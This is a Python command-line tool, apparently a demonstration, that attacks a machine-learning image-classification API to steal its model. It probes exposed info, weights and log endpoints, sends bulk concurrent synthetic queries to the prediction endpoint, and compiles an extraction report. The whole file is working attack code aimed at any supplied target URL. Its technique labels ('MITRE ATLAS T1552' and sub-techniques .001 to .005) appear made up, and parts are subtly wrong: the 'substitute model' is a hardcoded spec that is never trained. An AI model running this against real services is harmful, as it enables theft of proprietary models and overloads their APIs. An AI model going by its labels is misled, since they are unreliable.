#!/usr/bin/env python3
"""
Model Extraction Attack Tool
Demonstrates MITRE ATLAS T1552 - Steal ML Model technique

This tool attempts to extract model parameters and behavior through
API queries and reconstruction techniques.
"""

import requests
import numpy as np
import json
import time
import logging
import argparse
import os
import torch
import torch.nn as nn
from PIL import Image
import concurrent.futures
from typing import List, Dict, Any
import hashlib
import itertools

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ModelExtractor:
    """
    Implements model extraction attacks aligned with MITRE ATLAS T1552
    """
    
    def __init__(self, target_url: str, max_queries: int = 10000):
        self.target_url = target_url.rstrip('/')
        self.max_queries = max_queries
        self.queries_made = 0
        self.session = requests.Session()
        self.model_info = {}
        self.prediction_cache = {}
        
    def gather_model_info(self) -> Dict[str, Any]:
        """
        MITRE ATLAS T1552.001 - Model Architecture Extraction
        Extract model architecture and metadata through information disclosure
        """
        logger.info("Gathering model information...")
        
        endpoints = [
            '/model/info',
            '/model/weights',
            '/health',
            '/logs'
        ]
        
        model_info = {}
        
        for endpoint in endpoints:
            try:
                response = self.session.get(f"{self.target_url}{endpoint}", timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    model_info[endpoint] = data
                    logger.info(f"Successfully extracted info from {endpoint}")
                else:
                    logger.warning(f"Failed to access {endpoint}: {response.status_code}")
            except Exception as e:
                logger.error(f"Error accessing {endpoint}: {e}")
        
        # Extract specific model parameters if available
        if '/model/info' in model_info:
            info = model_info['/model/info']
            self.model_info = {
                'model_type': info.get('model_type'),
                'num_classes': info.get('num_classes'),
                'parameters_count': info.get('parameters_count'),
                'model_size_mb': info.get('model_size_mb'),
                'class_names': info.get('class_names', [])
            }
            logger.info(f"Model type: {self.model_info['model_type']}")
            logger.info(f"Number of classes: {self.model_info['num_classes']}")
            logger.info(f"Parameters: {self.model_info['parameters_count']:,}")
        
        return model_info
    
    def extract_layer_weights(self, layer_names: List[str] = None) -> Dict[str, Any]:
        """
        MITRE ATLAS T1552.002 - Parameter Extraction
        Extract model weights through vulnerable endpoints
        """
        logger.info("Attempting to extract layer weights...")
        
        if layer_names is None:
            # Common layer names to try
            layer_names = [
                'conv1', 'conv2', 'conv3', 'conv4', 'conv5',
                'fc', 'classifier', 'features',
                'layer1', 'layer2', 'layer3', 'layer4',
                'bn1', 'bn2', 'relu'
            ]
        
        extracted_weights = {}
        
        for layer in layer_names:
            try:
                response = self.session.get(
                    f"{self.target_url}/model/weights",
                    params={'layer': layer},
                    timeout=30
                )
                
                if response.status_code == 200:
                    data = response.json()
                    extracted_weights[layer] = {
                        'weights': data.get('weights'),
                        'shape': data.get('shape')
                    }
                    logger.info(f"Extracted weights for layer: {layer} (shape: {data.get('shape')})")
                else:
                    logger.debug(f"No weights found for layer: {layer}")
                    
            except Exception as e:
                logger.error(f"Error extracting weights for {layer}: {e}")
        
        return extracted_weights
    
    def generate_synthetic_data(self, num_samples: int = 1000) -> List[np.ndarray]:
        """
        Generate synthetic input data for model probing
        """
        logger.info(f"Generating {num_samples} synthetic samples...")
        
        synthetic_data = []
        
        # Generate different types of synthetic images
        for i in range(num_samples):
            # Random noise images
            if i % 4 == 0:
                data = np.random.randint(0, 256, (224, 224, 3), dtype=np.uint8)
            # Gradient images
            elif i % 4 == 1:
                x, y = np.meshgrid(np.linspace(0, 255, 224), np.linspace(0, 255, 224))
                data = np.stack([x, y, (x+y)/2], axis=2).astype(np.uint8)
            # Solid color images
            elif i % 4 == 2:
                color = np.random.randint(0, 256, 3)
                data = np.full((224, 224, 3), color, dtype=np.uint8)
            # Pattern images
            else:
                pattern = np.sin(np.linspace(0, 20*np.pi, 224*224)).reshape(224, 224)
                pattern = ((pattern + 1) * 127.5).astype(np.uint8)
                data = np.stack([pattern, pattern, pattern], axis=2)
            
            synthetic_data.append(data)
        
        return synthetic_data
    
    def query_model_batch(self, image_data_list: List[np.ndarray], 
                         max_workers: int = 5) -> List[Dict[str, Any]]:
        """
        Query model with batch of images using threading for efficiency
        """
        def query_single(image_data):
            if self.queries_made >= self.max_queries:
                return None
                
            try:
                # Convert numpy array to PIL Image
                image = Image.fromarray(image_data)
                
                # Save temporarily
                temp_path = f"/tmp/query_{int(time.time())}_{np.random.randint(1000)}.jpg"
                image.save(temp_path)
                
                # Query model
                with open(temp_path, 'rb') as f:
                    files = {'file': f}
                    response = self.session.post(
                        f"{self.target_url}/predict",
                        files=files,
                        timeout=30
                    )
                
                # Clean up
                os.remove(temp_path)
                
                self.queries_made += 1
                
                if response.status_code == 200:
                    return response.json()
                else:
                    logger.warning(f"Query failed: {response.status_code}")
                    return None
                    
            except Exception as e:
                logger.error(f"Query error: {e}")
                return None
        
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_idx = {
                executor.submit(query_single, img): idx 
                for idx, img in enumerate(image_data_list)
            }
            
            for future in concurrent.futures.as_completed(future_to_idx):
                result = future.result()
                if result:
                    results.append(result)
                
                if len(results) % 100 == 0:
                    logger.info(f"Completed {len(results)} queries...")
        
        return results
    
    def analyze_decision_boundaries(self, results: List[Dict[str, Any]]) -> Dict[str, Any]:
        """
        MITRE ATLAS T1552.003 - Decision Boundary Analysis
        Analyze model decision boundaries from query results
        """
        logger.info("Analyzing decision boundaries...")
        
        # Extract predictions and confidences
        predictions = []
        confidences = []
        
        for result in results:
            if 'predictions' in result and result['predictions']:
                pred = result['predictions'][0]
                predictions.append(pred['class_id'])
                confidences.append(pred['confidence'])
        
        # Analyze distribution
        analysis = {
            'total_queries': len(results),
            'unique_classes_predicted': len(set(predictions)),
            'average_confidence': np.mean(confidences) if confidences else 0,
            'confidence_std': np.std(confidences) if confidences else 0,
            'class_distribution': {}
        }
        
        # Class distribution
        from collections import Counter
        class_counts = Counter(predictions)
        total = len(predictions)
        
        for class_id, count in class_counts.items():
            analysis['class_distribution'][class_id] = {
                'count': count,
                'percentage': (count / total) * 100 if total > 0 else 0
            }
        
        logger.info(f"Decision boundary analysis: {analysis['unique_classes_predicted']} unique classes")
        logger.info(f"Average confidence: {analysis['average_confidence']:.3f} ± {analysis['confidence_std']:.3f}")
        
        return analysis
    
    def reconstruct_model_knowledge(self, results: List[Dict[str, Any]]) -> Dict[str, Any]:
        """
        MITRE ATLAS T1552.004 - Model Knowledge Reconstruction
        Attempt to reconstruct model knowledge from query results
        """
        logger.info("Reconstructing model knowledge...")
        
        # Build knowledge base from results
        knowledge_base = {
            'input_output_pairs': [],
            'confidence_patterns': {},
            'class_relationships': {},
            'model_behavior': {}
        }
        
        for result in results:
            if 'predictions' in result and result['predictions']:
                # Store input-output pairs
                top_pred = result['predictions'][0]
                knowledge_base['input_output_pairs'].append({
                    'predicted_class': top_pred['class_id'],
                    'confidence': top_pred['confidence'],
                    'top5_predictions': result['predictions'][:5]
                })
        
        # Analyze confidence patterns
        confidence_ranges = {
            'very_high': (0.9, 1.0),
            'high': (0.7, 0.9),
            'medium': (0.5, 0.7),
            'low': (0.3, 0.5),
            'very_low': (0.0, 0.3)
        }
        
        for range_name, (low, high) in confidence_ranges.items():
            count = sum(1 for pair in knowledge_base['input_output_pairs'] 
                       if low <= pair['confidence'] < high)
            knowledge_base['confidence_patterns'][range_name] = count
        
        # Model behavior analysis
        all_confidences = [pair['confidence'] for pair in knowledge_base['input_output_pairs']]
        knowledge_base['model_behavior'] = {
            'tends_to_be_confident': np.mean(all_confidences) > 0.7 if all_confidences else False,
            'confidence_variance': np.var(all_confidences) if all_confidences else 0,
            'most_common_prediction': max(
                knowledge_base['input_output_pairs'],
                key=lambda x: x['confidence']
            )['predicted_class'] if knowledge_base['input_output_pairs'] else None
        }
        
        logger.info(f"Reconstructed knowledge from {len(knowledge_base['input_output_pairs'])} samples")
        return knowledge_base
    
    def generate_substitute_model(self, training_data: List[Dict[str, Any]]) -> Dict[str, Any]:
        """
        MITRE ATLAS T1552.005 - Substitute Model Generation
        Generate a substitute model based on extracted knowledge
        """
        logger.info("Generating substitute model...")
        
        if not training_data:
            logger.warning("No training data available for substitute model")
            return {}
        
        # Simple substitute model specification
        substitute_model = {
            'type': 'simple_classifier',
            'input_size': [224, 224, 3],
            'num_classes': self.model_info.get('num_classes', 1000),
            'training_samples': len(training_data),
            'architecture': {
                'layers': [
                    {'type': 'conv2d', 'filters': 32, 'kernel_size': 3},
                    {'type': 'relu'},
                    {'type': 'maxpool', 'size': 2},
                    {'type': 'conv2d', 'filters': 64, 'kernel_size': 3},
                    {'type': 'relu'},
                    {'type': 'maxpool', 'size': 2},
                    {'type': 'flatten'},
                    {'type': 'dense', 'units': 128},
                    {'type': 'relu'},
                    {'type': 'dense', 'units': self.model_info.get('num_classes', 1000)},
                    {'type': 'softmax'}
                ]
            },
            'training_config': {
                'learning_rate': 0.001,
                'batch_size': 32,
                'epochs': 50,
                'optimizer': 'adam',
                'loss': 'categorical_crossentropy'
            }
        }
        
        logger.info("Substitute model specification generated")
        return substitute_model
    
    def execute_full_extraction(self, num_queries: int = 1000) -> Dict[str, Any]:
        """
        Execute complete model extraction attack
        """
        logger.info(f"Starting full model extraction attack with {num_queries} queries")
        logger.info("MITRE ATLAS Technique: T1552 - Steal ML Model")
        
        start_time = time.time()
        
        # Phase 1: Information Gathering
        logger.info("Phase 1: Information Gathering")
        model_info = self.gather_model_info()
        
        # Phase 2: Weight Extraction (if possible)
        logger.info("Phase 2: Weight Extraction")
        extracted_weights = self.extract_layer_weights()
        
        # Phase 3: Behavioral Analysis
        logger.info("Phase 3: Behavioral Analysis")
        synthetic_data = self.generate_synthetic_data(min(num_queries, 1000))
        query_results = self.query_model_batch(synthetic_data[:num_queries])
        
        # Phase 4: Decision Boundary Analysis
        logger.info("Phase 4: Decision Boundary Analysis")
        boundary_analysis = self.analyze_decision_boundaries(query_results)
        
        # Phase 5: Knowledge Reconstruction
        logger.info("Phase 5: Knowledge Reconstruction")
        reconstructed_knowledge = self.reconstruct_model_knowledge(query_results)
        
        # Phase 6: Substitute Model Generation
        logger.info("Phase 6: Substitute Model Generation")
        substitute_model = self.generate_substitute_model(query_results)
        
        # Compile final report
        extraction_report = {
            'attack_info': {
                'target_url': self.target_url,
                'total_queries': self.queries_made,
                'duration_seconds': time.time() - start_time,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            },
            'model_information': model_info,
            'extracted_weights': extracted_weights,
            'decision_boundary_analysis': boundary_analysis,
            'reconstructed_knowledge': reconstructed_knowledge,
            'substitute_model': substitute_model,
            'extraction_success_metrics': {
                'info_disclosure_success': bool(model_info),
                'weight_extraction_success': bool(extracted_weights),
                'behavioral_analysis_success': len(query_results) > 0,
                'overall_success_score': self._calculate_success_score(
                    model_info, extracted_weights, query_results
                )
            }
        }
        
        logger.info(f"Model extraction completed in {time.time() - start_time:.2f} seconds")
        logger.info(f"Success score: {extraction_report['extraction_success_metrics']['overall_success_score']:.2f}/1.0")
        
        return extraction_report
    
    def _calculate_success_score(self, model_info: Dict, weights: Dict, queries: List) -> float:
        """Calculate overall extraction success score"""
        score = 0.0
        
        # Information disclosure (30%)
        if model_info:
            score += 0.3
        
        # Weight extraction (40%)
        if weights:
            score += 0.4
        
        # Behavioral analysis (30%)
        if queries and len(queries) > 10:
            score += 0.3
        
        return score

def main():
    parser = argparse.ArgumentParser(description="Model Extraction Tool - MITRE ATLAS T1552")
    parser.add_argument("--target", required=True, help="Target model URL")
    parser.add_argument("--queries", type=int, default=1000, help="Number of queries to make")
    parser.add_argument("--output", default="./extraction_results", help="Output directory")
    parser.add_argument("--max-workers", type=int, default=5, help="Max concurrent workers")
    
    args = parser.parse_args()
    
    # Create output directory
    os.makedirs(args.output, exist_ok=True)
    
    # Test connectivity
    try:
        response = requests.get(f"{args.target}/health", timeout=10)
        if response.status_code != 200:
            logger.error(f"Target service not available: {response.status_code}")
            return
    except Exception as e:
        logger.error(f"Cannot connect to target: {e}")
        return
    
    # Initialize extractor
    extractor = ModelExtractor(args.target, max_queries=args.queries)
    
    logger.info(f"Target: {args.target}")
    logger.info(f"Max queries: {args.queries}")
    logger.info(f"MITRE ATLAS Technique: T1552 - Steal ML Model")
    
    # Execute extraction
    results = extractor.execute_full_extraction(args.queries)
    
    # Save results
    output_file = os.path.join(args.output, f"extraction_report_{int(time.time())}.json")
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)
    
    logger.info(f"Extraction report saved to {output_file}")
    logger.info("Model extraction attack demonstration completed")

if __name__ == "__main__":
    main() 